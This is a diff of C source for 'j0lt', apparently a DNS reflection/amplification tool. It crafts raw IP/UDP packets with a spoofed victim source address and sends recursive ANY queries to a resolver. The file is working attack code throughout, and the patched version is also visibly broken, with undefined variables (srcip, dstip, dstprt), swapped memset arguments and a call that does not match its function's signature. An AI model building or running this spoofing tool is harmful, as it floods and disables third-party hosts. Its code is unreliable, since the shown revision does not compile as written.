@@ -1,9 +1,7 @@
-/*
- * ref: rfc 1034 & 1035
- * sudo tcpdump -X -n udp port 53
- *
- * ./j0lt <resolver> <resolver port> <target ip to spoof> <target port>
- */
+/* ref: rfc 1034 & 1035
+* sudo tcpdump -X -n udp port 53
+* ./j0lt <resolver ip> <resolver port> <target ip to spoof> <target port>
+*/
 
 #include <stdbool.h>
 #include <stddef.h>
@@ -17,59 +15,18 @@
 #include <sys/types.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
-#include <netinet/ip.h> 
 #include <arpa/inet.h>
+
+#include <arpa/nameser.h> 
+#include <arpa/nameser_compat.h>
+
+#include <netinet/ip.h>
+#include <netinet/udp.h>
 
 #include <netdb.h>
 #include <unistd.h>
 
-#ifndef __BYTE_ORDER
-#define     __LITTLE_ENDIAN 0x1
-#define     __BYTE_ORDER __LITTLE_ENDIAN
-#endif // __BYTE_ORDER
-
-struct __attribute__((packed, aligned(1))) J0LT_UDPHDR
-{
-#if __BYTE_ORDER == __BIG_ENDIAN
-    uint64_t    srcprt : 16;
-    uint64_t    dstprt : 16;
-    uint64_t    len : 16;
-    uint64_t    checksum : 16;
-#endif
-
-#if __BYTE_ORDER == __LITTLE_ENDIAN || __BYTE_ORDER == __PDP_ENDIAN
-    uint64_t    checksum : 16;
-    uint64_t    len : 16;
-    uint64_t    dstprt : 16;
-    uint64_t    srcprt : 16;
-#endif
-};
-
-#define     FLAGS_DF 0b010
-#define     FLAGS_MF 0b001
-struct __attribute__((packed, aligned(1))) J0LT_TOS
-{
-#if __BYTE_ORDER == __BIG_ENDIAN
-    uint8_t     precedence : 3;
-    uint8_t     strm : 1;
-    uint8_t     reliability : 2;
-    uint8_t     sr : 1;
-    uint8_t     speed : 1;
-#endif
-
-#if __BYTE_ORDER == __LITTLE_ENDIAN || __BYTE_ORDER == __PDP_ENDIAN
-    uint8_t     speed : 1;
-    uint8_t     sr : 1;
-    uint8_t     reliability : 2;
-    uint8_t     strm : 1;
-    uint8_t     precedence : 3;
-#endif; 
-};
-
-#define     IHL_MIN 5
-#define     IHL_MAX 15
-
-struct __attribute__((packed, aligned(1))) J0LT_PSEUDOHDR
+typedef struct __attribute__((packed, aligned(1)))
 {
     uint32_t sourceaddr;
     uint32_t destaddr;
@@ -85,146 +42,11 @@ struct __attribute__((packed, aligned(1))) J0LT_PSEUDOHDR
     uint32_t protocol : 8;
     uint32_t zero : 8;
 #endif
-}
+} PSEUDOHDR;
 
-struct __attribute__((packed, aligned(1))) J0LT_IPHDR
-{
-#if __BYTE_ORDER == __BIG_ENDIAN
-    uint8_t     version : 4;    // format of the internet header (ipv4)
-    uint8_t     ihl : 4;        // len of internet header in 32 bit words,
-                                // points to the beginning of the data.
-#endif
-
-#if __BYTE_ORDER == __LITTLE_ENDIAN || __BYTE_ORDER == __PDP_ENDIAN
-    uint8_t     ihl : 4;
-    uint8_t     version : 4;
-#endif
-    struct J0LT_TOS tos;
-    uint16_t    total_len; // length of the datagram
-
-    uint16_t    id;
-#if __BYTE_ORDER == __BIG_ENDIAN
-    uint16_t    flags : 3;
-    uint16_t    offset : 13;
-#endif 
-
-#if __BYTE_ORDER == __LITTLE_ENDIAN || __BYTE_ORDER == __PDP_ENDIAN
-    uint16_t    offset : 13;
-    uint16_t    flags : 3;
-#endif 
-    uint8_t     ttl; // maximum time
-    uint8_t     protocol;
-    uint16_t    checksum;
-    uint32_t    sourceaddr;
-    uint32_t    destaddr;
-};
-#define     IPVER 4
-#define     ID 0x1337
-#define     QR 0 // query (0), response (1).
-
-typedef enum __opcode__ {
-    OP_QUERY = 0,
-    OP_IQUERY = 1,
-    OP_STATUS = 2,
-    OP_NOTIFY = 3,
-    OP_UPDATE = 4
-} opcode;
-#define     OPCODE OP_QUERY
-
-#define     AA 0 // Authoritative Answer
-#define     TC 0 // TrunCation
-#define     RD 1 // Recursion Desired   (END OF BYTE 3)
-#define     RA 0 // Recursion Available
-#define     Z  0 // Reserved
-#define     AD 1 // Authentic Data (DNS-SEC)
-#define     CD 0 // Checking Disabled (DNS-SEC)
-
-typedef enum __rcode__ {
-    RC_NO_ER = 0,
-    RC_FMT_ERR = 1,
-    RC_SRVR_FA = 2,
-    RC_NAME_ER = 3,
-    RC_NOT_IMP = 4,
-    RC_REFUSED = 5
-} rcode;
-#define     RCODE RC_NO_ER
-
-#define     QDCOUNT 1 // num entry question
-#define     ANCOUNT 0 // num RR answer
-#define     NSCOUNT 0 // num NS RR 
-#define     ARCOUNT 0 // num RR additional
-
-struct __attribute__((packed, aligned(1))) J0LT_DNSHDR
-{
-    uint16_t        id : 16;
-#if __BYTE_ORDER == __BIG_ENDIAN
-    // third byte
-    uint8_t     qr : 1;
-    uint8_t     opcode : 4;
-    uint8_t     aa : 1;
-    uint8_t     tc : 1;
-    uint8_t     rd : 1;
-    // fourth byte
-    uint8_t     ra : 1;
-    uint8_t     z : 1;
-    uint8_t     ad : 1;
-    uint8_t     cd : 1;
-    uint8_t     rcode : 4;
-#endif
-
-#if __BYTE_ORDER == __LITTLE_ENDIAN || __BYTE_ORDER == __PDP_ENDIAN
-    // third byte
-    uint8_t     rd : 1;
-    uint8_t     tc : 1;
-    uint8_t     aa : 1;
-    uint8_t     opcode : 4;
-    uint8_t     qr : 1;
-    // fourth byte
-    uint8_t     rcode : 4;
-    uint8_t     cd : 1;
-    uint8_t     ad : 1;
-    uint8_t     z : 1;
-    uint8_t     ra : 1;
-#endif
-    // remaining bytes
-    uint16_t    qdcount : 16;
-    uint16_t    ancount : 16;
-    uint16_t    nscount : 16;
-    uint16_t    arcount : 16;
-};
-
-typedef enum __type__ {
-    T_A = 1,// host address
-    T_NS = 2,// authoritative name server
-    T_MD = 3,// mail destination
-    T_MF = 4,// mail forwarder
-    T_CNAME = 5,// canonical name for alias
-    T_SOA = 6,// start of zone authority
-    T_MB = 7,// mailbox domain name
-    T_MG = 8,// mail group member
-    T_MR = 9,// mail rename domain name
-    T_NULL = 10, // null RR
-    T_WKS = 11, // service description
-    T_PTR = 12, // a domain name pointer
-    T_HINFO = 13, // host information
-    T_MINFO = 14, // mail list information
-    T_MX = 15, // mail exchange
-    T_TXT = 16, // text strings
-    QT_AXFR = 252, // transfer of entire zone
-    QT_MAILB = 253, // mailbox records 
-    QT_MAILA = 254, // req mail agent RRs
-    QT_ALL = 255 // req all records
-} type;
-#define     QTYPE QT_ALL
-
-typedef enum __class__ {
-    C_IN = 1, // the Internet
-    C_CS = 2, // the CSNET class
-    C_CH = 3, // the CHAOS class
-    C_HS = 4, // Hesiod [Dyer 87]
-    QC_ALL = 255, // anyclass
-} class;
-#define     QCLASS QC_ALL
+typedef struct iphdr IPHEADER;
+typedef struct udphdr UDPHEADER;
+typedef HEADER DNSHEADER;
 
 #define DEFINE_INSERT_FN(typename, datatype)           \
         bool insert_##typename                         \
@@ -274,8 +96,22 @@ DEFINE_INSERT_FN(dword, uint32_t)
 DEFINE_INSERT_FN(qword, uint64_t)
 #undef DEFINE_INSERT_FN
 
-#define     DEBUG   1
-#define     BUF_MAX 0x200
+#define     IPVER 4
+#define     IHL_MIN 5
+#define     IHL_MAX 15
+#define     ID 0x1337
+#define     QR 0 // query (0),
+#define     AA 0 // Authoritative Answer
+#define     TC 0 // TrunCation
+#define     RD 1 // Recursion Desired   (END OF BYTE 3)
+#define     RA 0 // Recursion Available
+#define     Z  0 // Reserved
+#define     AD 1 // Authentic Data (DNS-SEC)
+#define     CD 0 // Checking Disabled (DNS-SEC)
+#define     QDCOUNT 1 // num entry question
+#define     ANCOUNT 0 // num RR answer
+#define     NSCOUNT 0 // num NS RR 
+#define     ARCOUNT 0 // num RR additional
 
 const char* g_ansi = {
     " Usage: sudo ./j0lt [OPTION]...          \n"
@@ -294,55 +130,36 @@ const char* g_ansi = {
     "            the-scientist@rootstorm.com\n\n"
 };
 
-bool
-insert_question(void** buf, size_t* buflen,
-        const char* domain,
-        uint16_t query_type,
-        uint16_t query_class);
-bool
-insert_data(void** dst, size_t* dst_buflen,
-        const void* src, size_t src_len);
-bool
-insert_header(uint8_t** buf, size_t* buflen,
-        const struct J0LT_DNSHDR* header);
-bool
-create_dns_packet(uint8_t pktbuf[ ], size_t* buflen,
-        const struct J0LT_DNSHDR* header,
-        const char* domain,
-        uint16_t query_type,
-        uint16_t query_class);
-uint16_t
-checksum(const long* addr, int count);
-void
-pack_iphdr(struct J0LT_IPHDR* iphdr, struct J0LT_PSEUDOHDR* pseudohdr,
-        const char* sourceip, const char* destip,
-        size_t nwritten, size_t udpsz);
-void
-pack_udphdr(struct J0LT_UDPHDR* udphdr, struct J0LT_PSEUDOHDR* pseudohdr,
-        size_t nwritten, const char* port, struct sockaddr_in* addr);
-int
-main(int argc, char** argv)
+bool insert_question(void** buf, size_t* buflen, const char* domain, uint16_t query_type, uint16_t query_class);
+bool insert_data(void** dst, size_t* dst_buflen, const void* src, size_t src_len);
+bool insert_dns_header(uint8_t** buf, size_t* buflen, const DNSHEADER* header);
+
+void pack_iphdr(IPHEADER* iphdr, PSEUDOHDR* pseudohdr, const char* sourceip, const char* destip, size_t nwritten, size_t udpsz);
+void pack_udphdr(UDPHEADER* udphdr, PSEUDOHDR* pseudohdr, size_t nwritten, const char* port);
+uint16_t checksum(const long* addr, int count);
+
+int main(int argc, char** argv)
 {
+    const char* resolvip, * victimport, * victimip, * resolvprt;
+    uint8_t pktbuf[ NS_PACKETSZ ], * curpos;
     struct sockaddr_in addr, srcaddr;
-    socklen_t srcaddrlen;
-    int raw_sockfd;
-
     size_t buflen, nwritten;
-    uint8_t pktbuf[ BUF_MAX ];
+    int raw_sockfd;
+    bool status;
 
-    struct J0LT_DNSHDR sndheader = {
+    DNSHEADER dnsheader = {
         ID,
-        RD, TC, AA, OPCODE, QR,
-        RCODE, CD, AD, Z, RA,
+        RD, TC, AA, ns_o_query, QR,
+        ns_r_noerror, CD, AD, Z, RA,
         QDCOUNT,
         ANCOUNT,
         NSCOUNT,
         ARCOUNT
     };
 
-    struct J0LT_IPHDR iphdr;
-    struct J0LT_UDPHDR udphdr;
-    struct J0LT_PSEUDOHDR pseudohdr;
+    UDPHEADER udpheader;
+    IPHEADER ipheader;
+    PSEUDOHDR pseudoheader;
 
     printf("%s", g_ansi);
 
@@ -350,11 +167,20 @@ main(int argc, char** argv)
         goto fail_state;
     }
 
-    buflen = BUF_MAX;
-    memset(pktbuf, BUF_MAX, 0);
-    if (create_dns_packet(pktbuf, &buflen,
-        &sndheader, argv[ 3 ],
-        QTYPE, QCLASS) == false) {
+    resolvip = argv[ 1 ];
+    resolvprt = argv[ 2 ];
+    victimip = argv[ 3 ];
+    victimport = argv[ 4 ];
+
+    buflen = NS_PACKETSZ;
+    memset(pktbuf, NS_PACKETSZ, 0);
+
+    curpos = pktbuf;
+    status = true;
+    status &= insert_dns_header(curpos, &buflen, &dnsheader);
+    status &= insert_question(( void** ) curpos, &buflen, resolvip, ns_t_any, ns_c_any);
+
+    if (status == false) {
         fprintf(stderr, "create_dns_packet error\n");
         goto fail_state;
     }
@@ -365,11 +191,14 @@ main(int argc, char** argv)
         goto fail_state;
     }
 
-    addr.sin_family = AF_INET;
-    addr.sin_port = udphdr.dstprt;
-    addr.sin_addr.s_addr = iphdr.sourceaddr;
+    nwritten = NS_PACKETSZ - buflen;
+    pack_iphdr(&ipheader, &pseudoheader, srcip, dstip, nwritten, sizeof(UDPHEADER));
+    pack_udphdr(&udpheader, &pseudoheader, nwritten, dstprt, &addr);
 
-    nwritten = BUF_MAX - buflen;
+    addr.sin_family = AF_INET;
+    addr.sin_port = udpheader.uh_dport;
+    addr.sin_addr.s_addr = ipheader.saddr;
+
     sendto(raw_sockfd, pktbuf, nwritten, 0,
         ( const struct sockaddr* ) &addr,
         sizeof(addr));
@@ -382,31 +211,29 @@ fail_state:
 }
 
 void
-pack_iphdr(struct J0LT_IPHDR* iphdr, struct J0LT_PSEUDOHDR* pseudohdr,
+pack_iphdr(IPHEADER* iphdr, PSEUDOHDR* pseudohdr,
         const char* sourceip, const char* destip,
         size_t nwritten, size_t udpsz)
 {
-    memset(&iphdr, 0, sizeof(struct J0LT_IPHDR));
+    memset(&iphdr, 0, sizeof(IPHEADER));
     iphdr->version = IPVER;
     iphdr->ihl = IHL_MIN;
-    iphdr->total_len = htons(sizeof(struct J0LT_IPHDR) + nwritten + udpsz);
+    iphdr->tot_len = htons(sizeof(IPHEADER) + nwritten + udpsz);
     iphdr->id = htonl(ID);
     iphdr->ttl = 0xff;
     iphdr->protocol = getprotobyname("udp")->p_proto;
-    iphdr->sourceaddr = inet_addr(sourceip);
-    iphdr->destaddr = inet_addr(destip);
+    iphdr->saddr = inet_addr(sourceip);
+    iphdr->daddr = inet_addr(destip);
 
-    memset(&pseudohdr, 0, sizeof(struct J0LT_PSEUDOHDR));
+    memset(&pseudohdr, 0, sizeof(PSEUDOHDR));
     pseudohdr->protocol = iphdr->protocol;
-    pseudohdr->destaddr = iphdr->destaddr;
-    pseudohdr->sourceaddr = iphdr->sourceaddr;
+    pseudohdr->destaddr = iphdr->daddr;
+    pseudohdr->sourceaddr = iphdr->saddr;
 
-    iphdr->checksum = checksum(&iphdr, sizeof(struct J0LT_IPHDR));
+    iphdr->check = checksum(( const long* ) &iphdr, ( int ) sizeof(IPHEADER));
 }
 
-void
-pack_udphdr(struct J0LT_UDPHDR* udphdr, struct J0LT_PSEUDOHDR* pseudohdr,
-        size_t nwritten, const char* port, struct sockaddr_in* addr)
+void pack_udphdr(UDPHEADER* udphdr, PSEUDOHDR* pseudohdr, size_t nwritten, const char* port)
 {
     uint16_t port_uint16;
 
@@ -417,36 +244,16 @@ pack_udphdr(struct J0LT_UDPHDR* udphdr, struct J0LT_PSEUDOHDR* pseudohdr,
         exit(EXIT_FAILURE);
     }
 
-    memset(&udphdr, 0, sizeof(struct J0LT_UDPHDR));
-    udphdr->dstprt = htons(port_uint16);
-    udphdr->srcprt = 0x00;
-    udphdr->len = htons(nwritten + sizeof(struct J0LT_UDPHDR));
-    pseudohdr->udplen = udphdr->len;
+    memset(&udphdr, 0, sizeof(UDPHEADER));
+    udphdr->uh_dport = htons(port_uint16);
+    udphdr->uh_sport = 0x00;
+    udphdr->uh_ulen = htons(nwritten + sizeof(UDPHEADER));
+    pseudohdr->udplen = udphdr->uh_ulen;
 
-    udphdr->checksum = checksum(&pseudohdr, sizeof(struct J0LT_PSEUDOHDR));
+    udphdr->check = checksum(( const long* ) &pseudohdr, ( int ) sizeof(PSEUDOHDR));
 }
 
-bool
-create_dns_packet(uint8_t pktbuf[ ], size_t* buflen,
-        const struct J0LT_DNSHDR* header,
-        const char* domain,
-        uint16_t query_type,
-        uint16_t query_class)
-{
-    uint8_t* curpos = pktbuf;
-    bool status = true;
-
-    status &= insert_header(&curpos, buflen, header);
-    status &= insert_question(( void** ) &curpos,
-        buflen, domain,
-        query_type, query_class);
-
-    return status;
-}
-
-bool
-insert_header(uint8_t** buf, size_t*
-        buflen, const struct J0LT_DNSHDR* header)
+bool insert_dns_header(uint8_t** buf, size_t* buflen, const HEADER* header)
 {
     bool status;
     uint8_t third_byte, fourth_byte;
@@ -463,7 +270,7 @@ insert_header(uint8_t** buf, size_t*
         header->rcode |
         header->cd << 4 |
         header->ad << 5 |
-        header->z << 6 |
+        header->unused << 6 |
         header->ra << 7
     );
 
@@ -481,18 +288,15 @@ insert_header(uint8_t** buf, size_t*
     return status;
 }
 
-bool
-insert_question(void** buf, size_t* buflen,
-        const char* domain, uint16_t query_type,
-        uint16_t query_class)
+bool insert_question(void** buf, size_t* buflen, const char* domain, uint16_t query_type, uint16_t query_class)
 {
     const char* token;
-    char* saveptr, qname[ BUF_MAX ];
+    char* saveptr, qname[ NS_PACKETSZ ];
     size_t srclen, domainlen;
     bool status;
 
     domainlen = strlen(domain) + 1;
-    if (domainlen > BUF_MAX - 1) {
+    if (domainlen > NS_PACKETSZ - 1) {
         return false;
     }
     memcpy(qname, domain, domainlen);
@@ -510,19 +314,14 @@ insert_question(void** buf, size_t* buflen,
     }
 
     status = true;
-    status &= insert_byte(( uint8_t** ) buf,
-        buflen, 0x00);
-    status &= insert_word(( uint8_t** ) buf,
-        buflen, query_type);
-    status &= insert_word(( uint8_t** ) buf,
-        buflen, query_class);
+    status &= insert_byte(( uint8_t** ) buf, buflen, 0x00);
+    status &= insert_word(( uint8_t** ) buf, buflen, query_type);
+    status &= insert_word(( uint8_t** ) buf, buflen, query_class);
 
     return status;
 }
 
-bool
-insert_data(void** dst, size_t* dst_buflen,
-        const void* src, size_t src_len)
+bool insert_data(void** dst, size_t* dst_buflen, const void* src, size_t src_len)
 {
     if (*dst_buflen < src_len) {
         return false;
@@ -535,8 +334,7 @@ insert_data(void** dst, size_t* dst_buflen,
     return true;
 }
 
-uint16_t
-checksum(const long* addr, int count)
+uint16_t checksum(const long* addr, int count)
 {
     register long sum = 0;
 
@@ -552,5 +350,6 @@ checksum(const long* addr, int count)
     while (sum >> 16) {
         sum = (sum & 0xffff) + (sum >> 16);
     }
+
     return ~sum;
 }
